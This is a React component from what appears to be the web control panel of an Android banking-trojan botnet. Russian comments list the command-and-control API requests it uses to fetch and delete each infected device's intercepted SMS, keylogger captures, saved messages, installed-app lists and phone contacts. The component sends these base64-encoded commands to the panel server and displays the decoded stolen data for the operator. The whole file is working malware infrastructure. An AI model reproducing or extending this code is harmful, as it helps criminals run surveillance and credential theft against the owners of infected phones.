import React from 'react';
import SettingsContext from '../../Settings';
import { isNullOrUndefined } from 'util';
import $ from 'jquery';
import { Link } from 'react-router-dom';
import { Redirect } from 'react-router';
import { try_eval } from '../../serviceF';

/*
// {"request":"getLogsSMS","idbot":""}    <-- тут все логи бота(перехват СМС и т д)!
      
// {"request":"deleteLogsSMS","idbot":""}   <-- делете все логи бота!
        
// {"request":"getLogsKeylogger","idbot":""} <-- тут все логи кейлоггера!
        
// {"request":"deleteLogsKeylogger","idbot":""}  <-- делете все логи кейлоггера!
        
// {"request":"getLogsBots","idbot":""}  <-- тут все логи сохраненных смс!

// {"request":"deleteLogsBots","idbot":""}  <-- делете все логи сохраненных смс!
         
// {"request":"getlogsListApplications","idbot":""}   <-- список установленных прил!
        
// {"request":"dellogsListApplications","idbot":""}  <-- делете список установленных прил!
        
// {"request":"getlogsPhoneNumber","idbot":""}  <--  список номеров!
        
// {"request":"deletelogsPhoneNumber","idbot":""}<-- делете список номеров!

*/
class AllLogsPage extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
            stateCMD:'',
            ResultOnLog:[]
        }
    }

    ScrollToEnd() {
        try_eval('let objDiv = document.getElementById("logconsole"); objDiv.scrollTop = objDiv.scrollHeight;');
    }

    componentDidUpdate() {
        this.ScrollToEnd();
        
        try_eval('UpdateToolTips();');
    }

    componentWillReceiveProps() {
        let thisUrlData = SettingsContext.CurrentLogType;
        if( thisUrlData == 'getLogsSMS' ||
            thisUrlData == 'getLogsKeylogger' ||
            thisUrlData == 'getLogsBotsSmsSaved' ||
            thisUrlData == 'getlogsListApplications' ||
            thisUrlData == 'getlogsPhoneNumber' ) {
            this.setState({
                stateCMD: thisUrlData,
                ResultOnLog: []
            });
            this.SendLogsCommand(thisUrlData);
        }
        else {
        }
        this.ScrollToEnd();
    }

    SendDataAgain() {
        this.SendLogsCommand(SettingsContext.CurrentLogType);
    }

    Base64DecodeToStr(base64str) {
        return new Buffer(base64str.toString()  == null ? '' : base64str.toString(), 'base64').toString('utf-8');
    }
/*

                        <span class="debug">abcdefg</span>
                        <span class="info">Many messages, such logging, wow!</span>
                        <span class="warn">Warning, warning!</span>
                        <span class="error">Oh noes, y u do dis?</span>
 */

    ParseResult(resultJSON) {
        let MyLogsArr = [];
        if(this.state.stateCMD == 'getLogsBotsSmsSaved') {
            resultJSON.forEach(function(element) {
                MyLogsArr.push(<p><span class="info">SMS</span><span class="debug">{this.Base64DecodeToStr(element)}</span></p>);
            }.bind(this));
        }
        else if(this.state.stateCMD == 'getLogsSMS') {
            Object.keys(resultJSON).forEach(function(k){
                resultJSON[k].forEach(function(element) {
                    MyLogsArr.push(<p>
                        <span data-placement="bottom" data-toggle="tooltip" title={"Server date: " + element.datetoserver + "\nDevice date: " + element.datetodevice} class="warni"><i class="far fa-clock"></i></span>
                        <span>{"   "}</span>
                        <span class="debug">{this.Base64DecodeToStr(element.logs)}</span></p>
                        );
                }.bind(this));
            }.bind(this));
        }
        else if(this.state.stateCMD == 'getLogsKeylogger') {
            resultJSON.forEach(function(element) {
                MyLogsArr.push(<p><span class="info">LOG </span><span class="debug">{this.Base64DecodeToStr(element)}</span></p>);
            }.bind(this));
        }
        else if(this.state.stateCMD == 'getlogsListApplications') {
            resultJSON.forEach(function(element) {
                MyLogsArr.push(<p><span class="info">APP </span><span class="debug">{this.Base64DecodeToStr(element)}</span></p>);
            }.bind(this));
        }
        else if(this.state.stateCMD == 'getlogsPhoneNumber') {
            resultJSON.forEach(function(element) {
                MyLogsArr.push(<p><span class="info">CONTACT </span><span class="debug">{this.Base64DecodeToStr(element)}</span></p>);
            }.bind(this));
        }
        this.setState({
            ResultOnLog: MyLogsArr
        });
    }

    SendLogsCommand(cmdName, deletethis) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"request":"' + cmdName + '","idbot":"' + SettingsContext.CurrentSetBot + '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else {
					if(isNullOrUndefined(deletethis)) {
						this.ParseResult(result);
					}
					else {
						SettingsContext.ShowToast('success', 'logs delete success');
						this.setState({
							ResultOnLog: <Redirect to="/bots"/>
						});
					}
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error send bot cmd ' + cmdName + '. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    DeleteLogs(){
        if(this.state.stateCMD == 'getLogsSMS') {
            this.SendLogsCommand('deleteLogsSMS', true);
        }
        else if(this.state.stateCMD == 'getLogsKeylogger') {
            this.SendLogsCommand('deleteLogsKeylogger', true);
        }
        else if(this.state.stateCMD == 'getLogsBotsSmsSaved') {
            this.SendLogsCommand('deleteLogsBotsSmsSaved', true);
        }
        else if(this.state.stateCMD == 'getlogsListApplications') {
            this.SendLogsCommand('dellogsListApplications', true);
        }
        else if(this.state.stateCMD == 'getlogsPhoneNumber') {
            this.SendLogsCommand('deletelogsPhoneNumber', true);
        }
    }

    render () {
        return (
        <div>
            <table style={({width:'100%'})}>
                <tr>
                    <td style={({width:'50%'})}>
                        <h5>Current bot {SettingsContext.CurrentSetBot}</h5>
                    </td>
                    <td style={({width:'50%'})}>
                        <div class="check-bot" style={({float: 'right',marginRight: '10px',fontSize: '2rem'})}>
                            <i class="fas fa-sync-alt" data-placement="bottom" data-toggle="tooltip" title="Update logs" onClick={this.SendDataAgain.bind(this)} style={({marginRight:'20px'})}></i>
                            <i data-placement="bottom" data-toggle="tooltip" title="Delete this logs" onClick={this.DeleteLogs.bind(this)} class="fal fa-trash-alt"></i>
                        </div>
                    </td>
                </tr>
            </table>
            
            
            <div id={"logconsole"} class="console">
                <div class="codepre">
                    <code>
                        {this.state.ResultOnLog}
                    </code>
                </div>
            </div>
        </div>);
    }
}

export default AllLogsPage;